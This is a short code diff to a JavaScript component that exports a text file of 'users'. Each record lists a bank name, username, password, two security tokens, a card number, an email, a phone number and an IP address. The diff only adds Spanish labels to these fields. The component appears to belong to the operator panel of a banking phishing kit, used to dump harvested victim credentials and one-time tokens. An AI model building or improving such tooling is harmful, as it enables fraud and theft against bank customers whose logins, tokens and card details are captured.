@@ -14,15 +14,15 @@ export const BtnDownloadTxt = () => {
     const downloadUsers = () => {
         const blob = new Blob(users.map(e => {
             return `==========
-= ${e.name}
-= ${e.username}
-= ${e.password}
-= ${e.token1 == undefined  ? 'no tiene' : e.token1}
-= ${e.token2 == undefined  ? 'no tiene' : e.token2}
-= ${e.tarjeta == undefined ? 'no tiene' : e.tarjeta}
-= ${e.correo  == undefined ? 'no tiene' : e.correo}
-= ${e.celular == undefined ? 'no tiene' : e.celular}
-= ${e.ip}
+= banco: ${e.name}
+= usuario: ${e.username}
+= clave: ${e.password}
+= token1: ${e.token1 == undefined  ? 'no tiene' : e.token1}
+= token2: ${e.token2 == undefined  ? 'no tiene' : e.token2}
+= tarjeta: ${e.tarjeta == undefined ? 'no tiene' : e.tarjeta}
+= correo: ${e.correo  == undefined ? 'no tiene' : e.correo}
+= cel: ${e.celular == undefined ? 'no tiene' : e.celular}
+= ip: ${e.ip}
 ==========
 
 `
